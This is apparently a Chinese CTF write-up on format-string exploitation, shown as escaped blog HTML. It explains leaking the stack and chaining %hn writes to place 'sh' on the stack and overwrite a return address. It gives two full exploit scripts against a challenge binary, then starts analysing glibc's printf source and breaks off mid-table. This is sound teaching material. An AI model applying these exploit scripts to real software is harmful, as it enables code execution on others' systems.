title=\"思路分析\"></a>思路分析</h2><p>1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell<br>2.但是，常规的思路，需要的格式化次数不止3次。</p>\n<blockquote>\n<ol>\n<li>%p泄露栈地址</li>\n<li>把rbp链入（因为此题目栈上无<code>诸葛连弩</code>，要自己建）</li>\n<li>修改啥也不行，没次数了</li>\n</ol>\n</blockquote>\n<p>3.所以笔者在这里用了一些奇怪的方法。</p>\n<blockquote>\n<ol>\n<li>笔者开始想，因为<code>i</code>也是在栈上的，所以我可以修改<code>i</code>来增加次数</li>\n<li>但是，恰因如此，如果修改rbp，那么会影响下次循环对<code>i</code>的判断，</li>\n<li>于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。</li>\n<li>所以在笔者的精心的构造下，完成了10次格式化字符串的修改。</li>\n<li>比较重要的就是两个$n的运用。一个把<code>sh</code>写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.</li>\n</ol>\n</blockquote>\n<p>4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"10次格式化字符串\"><a href=\"#10次格式化字符串\" class=\"headerlink\" title=\"10次格式化字符串\"></a>10次格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2，3 rbp链入,修改rbp </span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#4,5,6 &#x27;sh&#x27;写入栈,修改rbp,把rbp+0x3e-4 链入并置0</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%8$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x6873</span>).encode() <span class=\"comment\"># 1 canshuxieshangl</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x58</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>-<span class=\"number\">4</span>-<span class=\"number\">0x58</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode() <span class=\"comment\"># 0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"number\">5</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x00</span>).<span class=\"built_in\">format</span>() <span class=\"comment\"># 1</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">######7 把rbp再次链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#####8 修改rbp 为rbp_low+0x38+0xe</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>).encode()</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 9 把rbp+8 链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">8</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 10 修改返回地址</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x1274</span>).encode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(payload))</span><br><span class=\"line\">payload +=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"优雅至极\"><a href=\"#优雅至极\" class=\"headerlink\" title=\"优雅至极\"></a>优雅至极</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2 gouzao </span></span><br><span class=\"line\">payload =  <span class=\"string\">b&quot;%p&quot;</span> * <span class=\"number\">4</span> </span><br><span class=\"line\">payload += <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x20</span>-<span class=\"number\">0x4</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x6873</span>-(rbp_low+<span class=\"number\">0x20</span>)+<span class=\"number\">0xe</span>)).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3 </span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;%p&quot;</span> *<span class=\"number\">4</span> </span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x12</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x1274</span>-(rbp_low+<span class=\"number\">0x38</span>)+<span class=\"number\">0x30</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"格式化字符串研究–一次性写的秘密\"><a href=\"#格式化字符串研究–一次性写的秘密\" class=\"headerlink\" title=\"格式化字符串研究–一次性写的秘密\"></a>格式化字符串研究–一次性写的秘密</h1><h2 id=\"相关定义\"><a href=\"#相关定义\" class=\"headerlink\" title=\"相关定义\"></a>相关定义</h2><h3 id=\"printf\"><a href=\"#printf\" class=\"headerlink\" title=\"__printf\"></a>__printf</h3><p>因为printf 函数，会调用__printf函数。我们直接来看该函数<br>它在&#x2F;stdio-common&#x2F;printf.c 中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">__printf (<span class=\"type\">const</span> <span class=\"type\">char</span> *format, ...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  va_list arg;</span><br><span class=\"line\">  <span class=\"type\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_start (arg, format);</span><br><span class=\"line\">  done = __vfprintf_internal (<span class=\"built_in\">stdout</span>, format, arg, <span class=\"number\">0</span>);</span><br><span class=\"line\">  va_end (arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">undef</span> _IO_printf</span></span><br><span class=\"line\">ldbl_strong_alias (__printf, <span class=\"built_in\">printf</span>);</span><br><span class=\"line\">ldbl_strong_alias (__printf, _IO_printf);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到，它主要就是调用了__vfprintf_internal函数，继续追踪</p>\n<h3 id=\"vfprintf-internal\"><a href=\"#vfprintf-internal\" class=\"headerlink\" title=\"vfprintf_internal\"></a>vfprintf_internal</h3><p>这个文件在&#x2F;stdio-common&#x2F;vfprintf_internal.c </p>\n<h4 id=\"宏相关定义\"><a href=\"#宏相关定义\" class=\"headerlink\" title=\"宏相关定义\"></a>宏相关定义</h4><p>在148行，有一个宏定义</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">define</span> vfprintf __vfprintf_internal</span></span><br></pre></td></tr></table></figure>\n\n<p>还有一个显然是占位符的一个表，看样子,还是有使用顺序的,对应的顺序里找对应的表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> STEP0_3_TABLE\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 0: at the beginning.  */</span>\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE step0_jumps[31] =\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#123;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unknown),\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_space),\t\t<span class=\"comment\">/* for &#x27; &#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_plus),\t\t<span class=\"comment\">/* for &#x27;+&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_minus),\t\t<span class=\"comment\">/* for &#x27;-&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_hash),\t\t<span class=\"comment\">/* for &#x27;&lt;hash&gt;&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_zero),\t\t<span class=\"comment\">/* for &#x27;0&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_quote),\t\t<span class=\"comment\">/* for &#x27;\\&#x27;&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (width_asterics),\t<span class=\"comment\">/* for &#x27;*&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (width),\t\t<span class=\"comment\">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (precision),\t\t<span class=\"comment\">/* for &#x27;.&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_half),\t\t<span class=\"comment\">/* for &#x27;h&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_long),\t\t<span class=\"comment\">/* for &#x27;l&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_longlong),\t<span class=\"comment\">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_size_t),\t\t<span class=\"comment\">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_percent),\t<span class=\"comment\">/* for &#x27;%&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_integer),\t<span class=\"comment\">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_unsigned),\t<span class=\"comment\">/* for &#x27;u&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_octal),\t\t<span class=\"comment\">/* for &#x27;o&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_hexa),\t\t<span class=\"comment\">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_float),\t\t<span class=\"comment\">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_character),\t<span class=\"comment\">/* for &#x27;c&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_string),\t<span class=\"comment\">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_pointer),\t<span class=\"comment\">/* for &#x27;p&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_number),\t<span class=\"comment\">/* for &#x27;n&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_strerror),\t<span class=\"comment\">/* for &#x27;m&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_wcharacter),\t<span class=\"comment\">/* for &#x27;C&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_floathex),\t<span class=\"comment\">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_ptrdiff_t),      <span class=\"comment\">/* for &#x27;t&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (mod_intmax_t),       <span class=\"comment\">/* for &#x27;j&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (flag_i18n),\t\t<span class=\"comment\">/* for &#x27;I&#x27; */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      REF (form_binary),\t<span class=\"comment\">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125;;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"comment\">/* Step 1: after processing width.  */</span>\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    static JUMP_TABLE_TYPE 